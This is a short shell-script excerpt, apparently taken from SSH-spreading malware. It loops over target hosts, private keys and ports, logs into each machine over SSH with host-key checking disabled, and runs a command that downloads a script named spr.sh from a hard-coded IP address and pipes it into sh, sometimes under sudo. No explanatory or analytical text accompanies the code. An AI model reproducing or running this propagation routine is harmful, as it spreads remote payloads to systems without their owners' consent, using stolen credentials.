    ...
    for host in $hostlist; do
      for key in $keylist; do
        for sshp in $sshports; do
          ...
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "sudo curl -L http://142.44.191.122/spr.sh|sh; sudo wget -q -O - http://142.44.191.122/spr.sh|sh;"
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "curl -L http://142.44.191.122/spr.sh|sh; wget -q -O - http://142.44.191.122/spr.sh|sh;"
        done
      done
    done
  done
